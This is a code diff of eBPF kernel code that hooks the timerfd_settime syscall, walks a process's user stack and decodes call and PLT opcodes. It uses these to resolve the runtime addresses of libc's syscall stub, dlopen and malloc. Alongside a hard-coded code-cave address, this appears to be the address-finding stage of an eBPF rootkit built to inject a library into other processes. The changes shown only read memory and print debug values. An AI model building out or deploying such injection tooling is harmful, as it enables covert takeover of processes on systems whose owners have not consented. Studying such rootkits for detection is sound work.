@@ -14,6 +14,7 @@
 #define OPCODE_JUMP_BYTE_0 0xe8
 #define GLIBC_OFFSET_MAIN_TO_SYSCALL 0xf00d0
 #define GLIBC_OFFSET_MAIN_TO_DLOPEN 0x12f120
+#define GLIBC_OFFSET_MAIN_TO_MALLOC 0x6eca0
 #define CODE_CAVE_ADDRESS 0x0000000000402e95
 
 struct sys_timerfd_settime_enter_ctx {
@@ -60,29 +61,35 @@ static __always_inline int check_syscall_opcodes(__u8* opcodes){
 
 static __always_inline int stack_extract_return_address_plt(__u64 stack){
     //We have a possible call instruction, we check if it starts with the correct format
-    __u8 *op = (__u8*)(stack - 0x5);
+    __u64 *op = (__u64*)(stack - 0x5);
     __u8 opcode_arr[5];
-    bpf_probe_read(&opcode_arr, 5*sizeof(__u8), op);
+    if(bpf_probe_read(&opcode_arr, 5*sizeof(__u8), op)<0){
+        //bpf_printk("Failed to read stack position\n");
+        return -1;
+    }
+    //bpf_printk(" -- Checking: %lx, res: %x %x", op, opcode_arr[0], opcode_arr[1]);
+    //bpf_printk("%x %x %x\n", opcode_arr[2], opcode_arr[3], opcode_arr[4]);
     if (opcode_arr[0] != OPCODE_JUMP_BYTE_0) {
         //bpf_printk(" -- Failed OPCODE: %x\n", opcode_arr[0]);
         return -1;
     }
+    bpf_printk("Success OPCODE: %lx\n", op);
 
     //We have localized the call instruction and thus quite probably the saved RIP. 
     //We proceed to get the offset of the call.
-    __u32 offset;
-    if(bpf_probe_read_user(&offset, sizeof(__u32), &op[1])<0){
+    __s32 offset = 0;
+    __u8* op8 = (__u8*)(stack - 0x5);
+    if(bpf_probe_read_user(&offset, sizeof(__s32), &op8[1])<0){ //This takes the 4 MSB omitting the first
         bpf_printk("Failed to read op[1]\n");
         return -1;
     }
-    bpf_printk("OP[1]: %x\n", &op[1]);
+    bpf_printk("OP64[1]: %x\n", &op[1]);
+    bpf_printk("OP8[1]: %x\n", &op8[1]);
     bpf_printk("OFFSET: %x\n", offset);
-    bpf_printk("OFFSET8: %x\n", (__u8)offset);
-    bpf_printk("OP8: %x\n", (__u8*)op);
-    __u32 sum = (uintptr_t)(op+offset+5);
-    bpf_printk("SUM: %x\n", sum);
-    
-    __u8* call_addr = (__u8*)(__u64)sum;
+    bpf_printk("OP: %lx\n", op);
+    __u64 sum = (uintptr_t)((__u64)(op8)+offset+5);
+    bpf_printk("SUM: %lx\n", sum);
+    __u64* call_addr = (__u64*)sum;
 
     //We check which address was called. We could either be at libc already after
     //following it, or in the PLT entry on the same executable as before.
@@ -98,19 +105,19 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
     bpf_printk("CALL_OPCODES: %lx\n", call_opcode);
 
     bpf_probe_read_user(&opcode_arr, 2*sizeof(__u8), call_addr);
-    //bpf_printk("OPCODE0: %x\n", opcode_arr[0]);
-    //bpf_printk("OPCODE1: %x\n", opcode_arr[1]);
+    bpf_printk("OPCODE0: %x\n", opcode_arr[0]);
+    bpf_printk("OPCODE1: %x\n", opcode_arr[1]);
 
+    __u8* call_addr_arr = (__u8*)call_addr;
     if(opcode_arr[0]==0xff && opcode_arr[1]==0x25){
         bpf_printk("Found PLT entry\n");
         //We analyze the offset of the jump specified ff 25 XX XX XX XX
-        //The address to which the jump takes us should be the actual syscall setup
-        __u32 j_offset;
-        bpf_probe_read_user(&j_offset, sizeof(__u32), &call_addr[2]);
-        //j_offset += 6;
+        //The address to which the jump takes us from the PLT.GOT should be the actual syscall setup
+        __s32 j_offset;
+        bpf_probe_read_user(&j_offset, sizeof(__s32), &call_addr_arr[2]); //4 LSB 
         //We obtain the address of the jump by adding the offset + our current memory address + 6 bytes of the current instruction
-        __u64* j_addr = (u64*)(call_addr + j_offset + 6);
-        bpf_printk("JOFFSET: %x\n", j_offset);
+        __u64* j_addr = (u64*)((__u64)(call_addr_arr) + j_offset + 0x6);
+        bpf_printk("JOFFSET: %lx\n", j_offset);
         bpf_printk("JADDR: %lx\n", j_addr);
         //Now that we have the address of the jump, we proceed to get the instruction opcodes there
         //However it's a bit more complex since what we have is the address in the GOT section where
@@ -257,6 +264,7 @@ int sys_exit_timerfd_settime(struct sys_timerfd_settime_exit_ctx *ctx){
     bpf_printk("PID: %u, SYSCALL_ADDR: %lx, STACK_RET_ADDR: %lx", pid, addr.libc_syscall_address, addr.stack_ret_address);
     bpf_printk("Address of libc main: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL);
     bpf_printk("Address of libc_dlopen_mode: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_DLOPEN);
+    bpf_printk("Address of malloc: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_MALLOC);
 
     return 0;
 }
